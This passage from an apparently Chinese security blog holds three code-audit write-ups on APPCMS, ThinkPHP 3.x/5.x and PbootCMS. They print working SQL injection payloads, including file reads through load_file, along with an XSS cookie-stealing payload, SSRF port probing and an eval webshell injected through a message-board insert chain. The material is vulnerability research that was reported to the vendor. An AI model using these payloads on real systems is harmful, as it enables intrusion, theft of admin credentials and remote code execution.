    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/21/APPCMS详细审计/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/21/APPCMS详细审计/" itemprop="url">代码审计 | APPCMS详细审计</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-21T08:15:41+08:00">
                2018-10-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>自己试着审计了下APPCMS,发现了一些问题,漏洞提交后写下这篇文章,记录一下。</p>
</blockquote>
<hr>
<p>发下的问题:</p>
<p>##<strong>1.配置文件用双引号 可执行任意命令</strong><br>    利用点:重装配置或后台修改网站配置时传入<code>${@phpinfo()}(可变变量)</code>即可</p>
<p>##<strong>2.后台模板存在代码执行与任意文件读取</strong><br>    模板为php后缀结尾,直接插入代码即可执行。获取模板内容时,可指定任 意文件造成任意文件读取</p>
<p>##<strong>3.三处任意文件删除</strong><br>(漏洞函数<code>m_del_resource()  m__delse()  m__del()</code>) 原因是都使用了底层定义的“问题”函数<code>de_resource()</code>导致</p>
<p>其中<code>m__del()</code>处的漏洞利用:<br>先将要删除的文件写入应用的logo处,然后在删除这个应用的时候触发<br><img src="http://static.zybuluo.com/chhyx/ubga64ktt6z1fyoj24xn1li1/image_1cq8rtii81jit120p12c4l1911bjm.png" alt="image_1cq8rtii81jit120p12c4l1911bjm.png-70kB"><br><img src="http://static.zybuluo.com/chhyx/9i8f0w73zt9eeo7lgcm0ue76/image_1cq8ru0toekeghv1ss1vq11f3i1j.png" alt="image_1cq8ru0toekeghv1ss1vq11f3i1j.png-105.6kB"></p>
<p>扩大危害:通过删除<code>install.lock.php</code>文件去重装CMS,然后在重装时,将PHP代码写进配置文件进行<code>Getshell</code>。</p>
<p>##<strong>4.readfile()导致的ssrf漏洞:</strong><br>漏洞文件:</p>
<pre><code>#upload\pic.php

&lt;?php
if(isset($_GET[&apos;url&apos;]) &amp;&amp; trim($_GET[&apos;url&apos;]) != &apos;&apos; &amp;&amp; isset($_GET[&apos;type&apos;])) {
    $img_url=trim($_GET[&apos;url&apos;]);
    $img_url = base64_decode($img_url);
    $img_url=strtolower(trim($img_url));
    $_GET[&apos;type&apos;]=strtolower(trim($_GET[&apos;type&apos;]));
    //var_dump(chr(0));die();

    $urls=explode(&apos;.&apos;,$img_url);
    //var_dump($img_url);die();
    if(count($urls)&lt;=1) die(&apos;image type forbidden 0&apos;);
    $file_type=$urls[count($urls)-1]; 

    if(in_array($file_type,array(&apos;jpg&apos;,&apos;gif&apos;,&apos;png&apos;,&apos;jpeg&apos;))){}else{ die(&apos;image type foridden 1&apos;);}

    if(strstr($img_url,&apos;php&apos;)) die(&apos;image type forbidden 2&apos;);

    if(strstr($img_url,chr(0)))die(&apos;image type forbidden 3&apos;);
    if(strlen($img_url)&gt;256)die(&apos;url too length forbidden 4&apos;);

    header(&quot;Content-Type: image/{$_GET[&apos;type&apos;]}&quot;);

    readfile($img_url);

} else {
    die(&apos;image not find！&apos;);
}

?&gt;
</code></pre><p>这里<code>readfile()</code>造成ssrf漏洞</p>
<pre><code>对传进来的url参数进行base64解码
最后需含有.jpg         ?1.jpg即可绕过
url不含php大小写 
过滤chr(0)防止00截断
长度不超过256个字符
</code></pre><p>经测试,这个是有回显的ssrf,可用于内网探测及进一步的内网渗透</p>
<p>利用:将<code>http://127.0.0.1:80/?1.jpg</code>经<code>base64</code>编码赋值给<code>$url</code>然后去爆破,这里我是将整个url设置为爆破参数 去爆破的</p>
<p><img src="http://static.zybuluo.com/chhyx/9x9p8y09s4vptj7ebgf4282a/image_1cq8hnl5t1frgoui1176o5ot09.png" alt="image_1cq8hnl5t1frgoui1176o5ot09.png-89.9kB"></p>
<p>爆破出83 81 85 89等端口是存在的</p>
<p>漏洞利用:</p>
<pre><code>读取非PHP文件
探测内网开放情况
</code></pre><p>##<strong>5.留言处insert注入:</strong><br>漏洞文件:</p>
<pre><code>#upload\commont.php m__add()
function m__add() {
    ...
    $fields[&apos;ip&apos;] = helper :: getip();//
....
$res = $dbm -&gt; single_insert(TB_PREFIX . &apos;comment&apos;, $fields);
</code></pre><p><img src="http://static.zybuluo.com/chhyx/t0bljlcchrcapy3902xowz40/image_1cq8vgsipdrjvgk1cup1fvctqf2q.png" alt="image_1cq8vgsipdrjvgk1cup1fvctqf2q.png-57.4kB"></p>
<p>跟进<code>getip()</code>函数:</p>
<pre><code>#upload\core\helper.class.php
public static function getip() {
    $onlineip = &apos;&apos;;
    if (getenv(&apos;HTTP_CLIENT_IP&apos;) &amp;&amp; strcasecmp(getenv(&apos;HTTP_CLIENT_IP&apos;), &apos;unknown&apos;)) {
        $onlineip = getenv(&apos;HTTP_CLIENT_IP&apos;);
    } elseif (getenv(&apos;REMOTE_ADDR&apos;) &amp;&amp; strcasecmp(getenv(&apos;REMOTE_ADDR&apos;), &apos;unknown&apos;)) {
        $onlineip = getenv(&apos;REMOTE_ADDR&apos;);
    } elseif (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &apos;unknown&apos;)) {
        $onlineip = $_SERVER[&apos;REMOTE_ADDR&apos;];
    }
    return $onlineip;
}
</code></pre><p>很明显这里没过滤,可伪造ip与注入语句,跟进<code>single_insert()</code>函数:</p>
<pre><code>public function single_insert($table_name, $fields) {
...
$sql_field = &quot;&quot;;
$sql_value = &quot;&quot;; 
// 遍历字段和值
foreach($fields as $key =&gt; $value) {
    $sql_field .= &quot;,$key&quot;;
    $sql_value .= &quot;,&apos;$value&apos;&quot;;
} 

$sql_field = substr($sql_field, 1);
$sql_value = substr($sql_value, 1);

$sql = &quot;insert into $table_name ($sql_field) values ($sql_value)&quot;; //组合SQL

var_dump($sql);
</code></pre><p>$result = $this -&gt; query_insert($sql);<br>    return $result;<br>    }</p>
<p>可看到这里的对传进来的<code>$fields</code>数组并无过滤,直接拼接到<code>sql</code>语句中导致注入。<br>但是这里的情况是</p>
<pre><code>a.执行完插入评论的sql语句后的结果返回到了$res中,但是下面并没有输出$res[&apos;error&apos;]     //不能使用报错注入
b.需要闭合一个用应用程序&quot;已经打开但还未关闭&quot;的参数(ip)
c.这里的IP字段限制为20个字符 想直接在这个位置获取数据不太现实
</code></pre><p><img src="http://static.zybuluo.com/chhyx/vgrxfqy384rmasyffsmy4m06/image_1cqa4s1ce13fi176cjllun916u49.png" alt="image_1cqa4s1ce13fi176cjllun916u49.png-57.8kB"></p>
<p>所以我们采用<code>insert</code>插入2条数据的方式将注入语句插在前台显示的字段<code>(uname,content,date_add,ip)</code>即可。(这里的<code>date_add</code>与<code>ip</code>长度限制为11、20)<br>payload:</p>
<pre><code>client-ip: 1&apos;),(&apos;1&apos;,&apos;0&apos;,&apos;0&apos;,(select user()),&apos;aa&apos;,&apos;1540085527&apos;,&apos;2.2.2.2&apos;)#
</code></pre><p><img src="http://static.zybuluo.com/chhyx/63jlre1n5oag3od5gcfi925y/image_1cq91e1cd1mv353fe1qttg1b37.png" alt="image_1cq91e1cd1mv353fe1qttg1b37.png-185.5kB"></p>
<p>返回前台评论区查看:<br><img src="http://static.zybuluo.com/chhyx/d5im0deb7h6cin0l1jow9uhz/image_1cqa6otgtbj7175a81u1udtj422d.png" alt="image_1cqa6otgtbj7175a81u1udtj422d.png-52.9kB"><br>成功得到<code>user()</code>信息。</p>
<p>这是两句废话:<br>如果我们改变一下ip的限制长度且将<code>$ress[&#39;error&#39;]</code>改为<code>$res[&#39;error&#39;]</code>即可报错注入。</p>
<p><img src="http://static.zybuluo.com/chhyx/9kj23whc7egbdkt2epykvcis/image_1cqa6gpvl1jl71ups1552rlq166g1g.png" alt="image_1cqa6gpvl1jl71ups1552rlq166g1g.png-117.3kB"></p>
<p>##<strong>注入深入利用</strong></p>
<p>漏洞利用:参照之前笔者的文章:<a href="https://p0rz9.github.io/2018/10/17/PbootCMS_V1.2.1%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">PbootCMS_V1.2.1组合漏洞之前台无限制命令执行</a>,这里我们可以用<code>insert注入+xss+来GETSHELL</code></p>
<pre><code>1.插入xss代码获取 后台路径及管理员cookie
2.利用load_file()任意文件读取(需知道路径)
3.获取后台账号密码（该APPCMS更换了后台路径）
4.后台php文件写shell
</code></pre><p><strong>读取文件:</strong><br>我们要读取文件,首先要使其报错获取网站绝对路径:<br><img src="http://static.zybuluo.com/chhyx/23ejc5lluw9cvai8nqo2i8qz/image_1cqan4cuu1urc1upr187i1ns7q5n16.png" alt="image_1cqan4cuu1urc1upr187i1ns7q5n16.png-116.9kB"><br><img src="http://static.zybuluo.com/chhyx/e5x9prqs06fuw9t2pvh0aay6/image_1cqan2b5t18jeh2qre9usqlivp.png" alt="image_1cqan2b5t18jeh2qre9usqlivp.png-113.1kB"></p>
<p>笔者以读取存储后台口令的文件为例:</p>
<pre><code>core\config.php
</code></pre><p>payload:</p>
<pre><code>client-ip: 1&apos;),(&apos;1&apos;,&apos;0&apos;,&apos;0&apos;,(select SUBSTRING( load_file(&apos;C:\\web\\WWW\\appcms_2.0.101\\upload\\core\\config.php&apos;),500,300)),&apos;aa&apos;,&apos;1540085527&apos;,&apos;2.2.2.2&apos;)#
</code></pre><p><img src="http://static.zybuluo.com/chhyx/dkandni4om7bnynr9jlz1yfo/image_1cqaqme1nsaj1b2i15j811k616nl3v.png" alt="image_1cqaqme1nsaj1b2i15j811k616nl3v.png-121kB"><br>返回前台留言板查看获取的文件内容:<br><img src="http://static.zybuluo.com/chhyx/si98287nh23iisr9tdbc65az/image_1cqaqpgqn1pv730ims81jhf1ked6c.png" alt="image_1cqaqpgqn1pv730ims81jhf1ked6c.png-112.7kB"></p>
<p><strong>XSS:</strong><br>我们以弹cookie为例子,在实战中插入xss平台接收后台COOKIE即可。<br>payload:</p>
<pre><code>client-ip: 1&apos;),(&apos;1&apos;,&apos;0&apos;,&apos;0&apos;,&apos;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&apos;,&apos;aa&apos;,&apos;1540085527&apos;,&apos;2.2.2.2&apos;)#
</code></pre><p>因为前台并没有登陆接口,所以弹出非登陆状态下的<code>PHPSESSION</code><br>前台留言板访问:<br><img src="http://static.zybuluo.com/chhyx/rwmq8zayn17q74l38yk7gin1/image_1cqar5dgl1fm1drn14stqlnktc7j.png" alt="image_1cqar5dgl1fm1drn14stqlnktc7j.png-88.1kB"></p>
<p>后台管理员访问:<br><img src="http://static.zybuluo.com/chhyx/xzzenl1ornmpn1darbezjgrd/image_1cqar3c9216g4lh1ckdni8g6o76.png" alt="image_1cqar3c9216g4lh1ckdni8g6o76.png-46.8kB"></p>
<p>平台接收后台地址及cookie后,我们进入后台用配置文件或模板处的命令执行即可拿Shell。</p>
<p>##<strong>6.鸡肋文件包含</strong><br>在读入口文件index.php时 碰到这样一行代码:</p>
<pre><code>require(dirname(__FILE__) . $tmp_file);
</code></pre><p>感觉可以利用,通过追溯可控参数<code>$tmp_file</code>发现$tpl时这样取得</p>
<pre><code>$tpl = isset($_GET[&apos;tpl&apos;]) ? $_GET[&apos;tpl&apos;] : &apos;index&apos;;
</code></pre><p>但是下面经过了这样一处判断 经测试:</p>
<pre><code>if (substr($tpl, strlen($tpl) - 4, 4) == &apos;.php&apos;) {
    $tmp_file = &apos;/templates/&apos; . $from_mobile . &apos;/&apos; . $tpl;
} else {
    $tmp_file = &apos;/templates/&apos; . $from_mobile . &apos;/&apos; . $tpl . &apos;.php&apos;;
}
</code></pre><p>只能包含后缀为php的文件<br>利用的话:包含安装时的<code>step4.php</code>可看到数据库信息:</p>
<p><img src="http://static.zybuluo.com/chhyx/6j5d44yjrravi2qu68xq5ddn/image_1cqbgbcq43gcpvf1kf20acgq1m.png" alt="image_1cqbgbcq43gcpvf1kf20acgq1m.png-66.8kB"></p>
<p>涉及知识点:</p>
<pre><code>$_SERVER[&quot;HTTP_CLIENT_IP&quot;] 获得的值是HTTP中 Client-Ip( client-ip书写测试结果：服务器为window环境，则client-ip可以大小写混写。服务器环境为linux，则client-ip必须全部大写) 

$_SERVER[&quot;REMOTE_ADDR&quot;] 获得的值为 最后一个跟你的服务器握手的IP，可能会是代理IP或者其他 

$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] 获得的值是HTTP中 X-Forwarded-For 

$_SERVER[&quot;HTTP_REFERER&quot;] 获得的值为 HTTP中的Referer 
</code></pre><p><code>insert into</code>一次性插入2条语句:<br><img src="http://static.zybuluo.com/chhyx/uux01p11khk2o94uw95fmies/image_1cq8ujiqq1qrggsg1a551rf9p7g20.png" alt="image_1cq8ujiqq1qrggsg1a551rf9p7g20.png-24.3kB"><br><img src="http://static.zybuluo.com/chhyx/5zr9h8qzxkyww0ekc6os0fkg/image_1cq8uk1mi6pt15dv16cf118igvq2d.png" alt="image_1cq8uk1mi6pt15dv16cf118igvq2d.png-12.1kB"></p>
<p>关于insert into注入 在最后一个字段的注入可以利用<code>当一个整数与一个字符相加时,整数具有操作符优先级</code><br>参考链接:<a href="https://blog.csdn.net/qq_41007744/article/details/80213449?utm_source=blogxgwz0" target="_blank" rel="noopener">https://blog.csdn.net/qq_41007744/article/details/80213449?utm_source=blogxgwz0</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/18/Thinkphp3.x_5.x框架审计总结/" itemprop="url">代码审计 | Thinkphp3.x/5.x框架审计总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-18T08:15:41+08:00">
                2018-10-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>今天重新返回去看了下前几天复现几个TP框架的洞,总结总结。</p>
</blockquote>
<hr>
<p>今天重新返回去复现TP的洞,发现5.0.10那处盲注复现不了,经过调试发现是自己例子写错大小写导致绕过了系统的判断才产生漏洞 尴尬啊。原文:<br><a href="https://p0rz9.github.io/2018/09/25/thinkphp5.0.10%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%85%A8%E5%AF%BC%E8%87%B4%E4%B8%80%E5%A4%84%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注</a><br>然后自己绕不过<br><img src="http://static.zybuluo.com/chhyx/m6dz5oxp4xm30v76ioiizzrc/image_1cq3l6los507172715g41e5lirp5f.png" alt="image_1cq3l6los507172715g41e5lirp5f.png-45.9kB"><br>有绕过的大佬欢迎交流。</p>
<p>##<strong>版本:3.x</strong></p>
<p><strong>tp3.2.3 bind 注入</strong><br><strong>漏洞成因:</strong><code>当where条件可控时,parseWhereItem()的inc操作直接拼接可控值$val造成注入</code><br><strong>payload:</strong><code>id[]=bind&amp;id[]=0 and (updatexml(1,concat(0x7e,(select%20user()),0x7e),1))</code><br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
<p><strong>tp&lt;=3.2.4 order by注入</strong><br><strong>漏洞成因:</strong><code>parseOrder()处理函数直接拼接传进来的字符串</code><br><img src="http://static.zybuluo.com/chhyx/znarexfdy7bxxmqjevut7nen/image_1cq3i0btnbs51tsp139t1q61dhn1p.png" alt="image_1cq3i0btnbs51tsp139t1q61dhn1p.png-40.8kB"><br><strong>payload:</strong><br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
<p><strong>ThinkPHP 3.2.3 find_select_delete注入</strong><br><strong>成因:</strong><code>$this-&gt;_parseOptions($options);方法进行了参数合并又没有二次校验导致的注入</code><br><strong>payload:</strong><code>?id[where]=id = 1 and updatexml(0,concat(0xa,user()),0)</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/29/Thinkphp3.2%20find_delete_selete%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/29/Thinkphp3.2_find_delete_selete注入分析/</a></p>
<p>##<strong>版本:5.x</strong><br><strong>1.thinkphp5.0.9 鸡肋SQL注入(PDo预处理)+信息泄露</strong><br><strong>成因:</strong><code>debug开启造成信息泄露+parseWhereItem()的in操作对$value无过滤且直接拼接</code><br><strong>payload:</strong><code>?id[0,updatexml(0,concat(0xa,user()),0)]=1</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/19/ThinkPHP%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E6%B3%84%E9%9C%B2%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81+%E9%B8%A1%E8%82%8Bsql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入</a></p>
<p><strong>2.thinkphp5.0.10 filterExp过滤不全导致注入</strong><br><strong>成因:</strong><code>助手函数input默认调用的filterExp()函数过滤不全导致注入</code><br><strong>payload:</strong><code>user[0]=not like&amp;user[1][0]=aaa&amp;user[1][8]=bbb&amp;user[2]=) and 1=2 union select 1,user(),3 from user--</code><br><strong>参考链接:</strong><a href="http://static.zybuluo.com/chhyx/81w6j9hqbr86tcsy5wpouq26/image_1cq3gbi4g1v0n1tqc15jf12191o80p.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致注入</a></p>
<p><strong>3.thinkphp5.0.14/15   insert/update注入(鸡肋)</strong><br><strong>成因:</strong><code>若传入参数为inc,parseData()函数会将将$val[1]与$val[2]拼接直接拼接导致注入</code><br><strong>payload:</strong><code>?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP框架%205.0.x%20sql注入</a></p>
<p><strong>4.thinkphp5.x order by注入(鸡肋)</strong><br><strong>成因:</strong><code>与tp&lt;=3.2.4 order by注入成因类似</code><br><strong>payload:</strong><code>order[id</code>, 2) and updatexml(1,concat(0x3a,user()),1)– a][0]=111`<br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
<p><strong>识别基于THINKPHP框架的CMS:</strong></p>
<pre><code>http://xxxx/index.php?c=4e5e5d7364f443e28fbf0d3ae744a59a
http://xxxx/4e5e5d7364f443e28fbf0d3ae744a59a
http://xxxxx/ThinkPHP/logo.png
http://xxxx/ThinkPHP/LICENSE.txt
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/17/PbootCMS_V1.2.1组合漏洞之前台无限制命令执行/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/17/PbootCMS_V1.2.1组合漏洞之前台无限制命令执行/" itemprop="url">代码审计 | PbootCMS_V1.2.1组合漏洞-->前台无限制命令执行</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-17T08:15:41+08:00">
                2018-10-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>跟大佬成功学到一招,insert注入进数据库修改留言状态+系统解析IF标签导致Getshell</p>
</blockquote>
<hr>
<p>PbootCMS分析可参考笔者以前的文章:<br><a href="https://p0rz9.github.io/2018/10/15/PbootCMS_V1.2.1%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1SQL%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/</a></p>
<p>##<strong>1.有限制的前台代码执行:</strong></p>
<p>漏洞成因:</p>
<pre><code>在前台留言处可利用IF标签插入PHP代码,后台管理员审核(限制)后,在显示到前台时造成代码执行
</code></pre><p>代码分析:<br>追踪解析<code>IF</code>标签的函数:</p>
<pre><code>apps\home\controller\ParserController.php
</code></pre><p><img src="http://static.zybuluo.com/chhyx/y2rorr5u2z6l9b056an74xai/image_1cq02djogf9i7iv5t88kb1o1r13.png" alt="image_1cq02djogf9i7iv5t88kb1o1r13.png-115.2kB"></p>
<p>漏洞利用:<br>a.留言处插入我们的<code>php</code>代码:<code>{pboot:if(eval($_POST[z]))}!!!{/pboot:if}</code><br><img src="http://static.zybuluo.com/chhyx/3sbr2ji5f6ognq4bni8931k6/image_1cq01gp3qd3m1lii14dajg1e7f9.png" alt="image_1cq01gp3qd3m1lii14dajg1e7f9.png-71.5kB"></p>
<p>b.管理员在后台审核,点击显示按钮后<br><img src="http://static.zybuluo.com/chhyx/yds22utr7vls2ieea9gpkqao/image_1cq01pm8h130ib1cabh1g5klpc9.png" alt="image_1cq01pm8h130ib1cabh1g5klpc9.png-63.6kB"></p>
<p>c.返回前台触发漏洞:<br><img src="http://static.zybuluo.com/chhyx/nydx70lad9cgc0n3axu17o43/image_1cq01s09huhf172n67u18kl1875m.png" alt="image_1cq01s09huhf172n67u18kl1875m.png-40.4kB"></p>
<p>因为这里需要管理员点击才能触发,所以显得有些鸡肋,但是这里我们可利用<code>insert</code>注入在插入数据库时就改变其显示状态来进行漏洞利用<br><img src="http://static.zybuluo.com/chhyx/rv54ynnytclos27cn3r8dbr0/image_1cq04ojff1qi710tllhq3981bn99.png" alt="image_1cq04ojff1qi710tllhq3981bn99.png-247.6kB"></p>
<p>##<strong>2.留言处<code>insert</code>注入:</strong><br>漏洞成因:</p>
<pre><code>使用有问题的底层`insert`操作,对数组的`key`值无过滤且直接拼接导致`SQL注入`问题
</code></pre><p>代码分析:<br>定位到留言的操作的文件</p>
<pre><code>#apps\home\controller\MessageController.php add()函数
public function add()
{...
    if ($_POST) {

        if (time() - session(&apos;lastsub&apos;) &lt; 10) {
            alert_back(&apos;您提交太频繁了，请稍后再试！&apos;);
        }
        // 验证码验证
        // 读取字段
        if (! $form = $this-&gt;model-&gt;getFormField(1)) {
            alert_back(&apos;留言表单不存在任何字段，请核对后重试！&apos;);
        }
        // 接收数据
        $mail_body = &apos;&apos;;
        foreach ($form as $value) {
            $field_data = post($value-&gt;name);

            if (is_array($field_data)) { // 如果是多选等情况时转换
                $field_data = implode(&apos;,&apos;, $field_data);//数组合并为字符串
            }
            if ($value-&gt;required &amp;&amp; ! $field_data) {
                alert_back($value-&gt;description . &apos;不能为空！&apos;);
            } else {
                $data[$value-&gt;name] = post($value-&gt;name);   //关键点
                $mail_body .= $value-&gt;description . &apos;：&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;;
            }
        }

        // 设置额外数据
        if ($data) {
            $data[&apos;acode&apos;] = session(&apos;lg&apos;);
            $data[&apos;user_ip&apos;] = ip2long(get_user_ip());
            $data[&apos;user_os&apos;] = get_user_os();
            $data[&apos;user_bs&apos;] = get_user_bs();
            $data[&apos;recontent&apos;] = &apos;&apos;;
            $data[&apos;status&apos;] = 0;
            $data[&apos;create_user&apos;] = &apos;guest&apos;;
            $data[&apos;update_user&apos;] = &apos;guest&apos;;
        }

        if ($this-&gt;model-&gt;addMessage($data)) {//跟进addmessage()
...
</code></pre><p>跟进<code>addMessage()</code>函数 </p>
<pre><code>public function addMessage($data)
   {
       return parent::table(&apos;ay_message&apos;)-&gt;autoTime()-&gt;insert($data);
   }
</code></pre><p>跟进insert():<br><img src="http://static.zybuluo.com/chhyx/xbmnhou6jp2w877deyajy1fe/image_1cq06973213jb11li1cta1l0ps4o3d.png" alt="image_1cq06973213jb11li1cta1l0ps4o3d.png-90.2kB"></p>
<p>因为底层<code>insert</code>操作对数组的<code>key</code>值无过滤且直接拼接导致<code>SQL注入</code>问题</p>
<p>SQL漏洞利用:<br><img src="http://static.zybuluo.com/chhyx/05koygr7wi11r9am4vbbbqaf/image_1cq05jbedse310ou1s4t1evlif6m.png" alt="image_1cq05jbedse310ou1s4t1evlif6m.png-91kB"></p>
<p>##<strong>3.组合漏洞—前台无限制命令执行:</strong></p>
<pre><code>url:http://127.0.0.1:81/index.php/Message/add

POST:content=1&amp;mobile=1&amp;contacts[acode`,`mobile`,`content`,`user_ip`,`user_os`,`user_bs`,`recontent`,`status`,`create_user`,`update_user`,`create_time`,`update_time`) VALUES (&apos;cn&apos;,&apos;1&apos;,0x7B70626F6F743A6966286576616C28245F504F53545B7A5D29297D2121217B2F70626F6F743A69667D,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;); -- a] = 1&amp;checkcode=xxxx
</code></pre><p>填写验证码点击提交后抓包：<br><img src="http://static.zybuluo.com/chhyx/gm2f2sxpuz13hpv89hr8npsv/image_1cq05u1j6s1k105up411nq6th713.png" alt="image_1cq05u1j6s1k105up411nq6th713.png-182.7kB"></p>
<p>可看到新插入的留言状态(<code>status</code>)为1<br>返回前台成功利用:<br><img src="http://static.zybuluo.com/chhyx/11utg2zml2gxlhyelusxmif0/image_1cq0625m4bi91qh11sqm16ea1mhc30.png" alt="image_1cq0625m4bi91qh11sqm16ea1mhc30.png-45.8kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/15/SQL注入基础/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/15/SQL注入基础/" itemprop="url">基础知识 | SQL注入基础</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-15T20:15:41+08:00">
                2018-10-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
